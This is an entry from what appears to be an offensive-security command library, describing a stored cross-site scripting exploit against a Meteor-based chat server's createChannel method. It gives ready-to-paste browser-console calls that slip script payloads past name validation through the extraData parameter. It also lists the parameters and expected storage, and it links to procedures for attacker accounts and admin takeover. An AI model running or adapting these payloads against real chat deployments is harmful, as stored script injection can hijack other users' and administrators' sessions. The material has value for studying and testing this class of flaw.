---
id: 123e4567-e89b-12d3-a456-426614174009
name: meteor-call-create-channel-xss
type: command
executor: javascript
data: >-
  Meteor.call('createChannel', 'valid-name', [], false, {}, { name: 'edit me
  <img src onerror=alert(origin)>' })
output: null
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T03:16:02.410Z'
platforms:
  - Web
tags:
  - xss
  - meteor
  - exploit
verified: false
validated: true
submitted: true
---

# meteor-call-create-channel-xss

## Command

```javascript
Meteor.call('createChannel', 'valid-name', [], false, {}, { name: 'edit me <img src onerror=alert(origin)>' })
```

## Description

Executes a Meteor method call in the browser console to create a channel, bypassing name validation by injecting the XSS payload into the extraData parameter, which gets merged into the room object and stored.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| 'valid-name' | Valid channel name for initial validation | Yes |
| [] | Empty members array | Yes |
| false | Public channel flag | Yes |
| {} | Empty options object | Yes |
| { name: 'edit me <img src onerror=alert(origin)>' } | extraData with malicious name override | Yes |

## Examples

### Basic Usage

```javascript
Meteor.call('createChannel', 'valid-name', [], false, {}, { name: 'edit me <img src onerror=alert(origin)>' })
```

### Advanced Usage

```javascript
Meteor.call('createChannel', 'test-channel', ['user1'], true, { custom: 'val' }, { name: 'payload <script>alert(1)</script>' })
```

## Expected Output

Channel created with ID returned, payload stored in database without triggering client validation.

## Related

- [[procedures/Create-Attacker-Account-and-Inject-XSS]]
- [[procedures/Trigger-XSS-for-Admin-Takeover]]
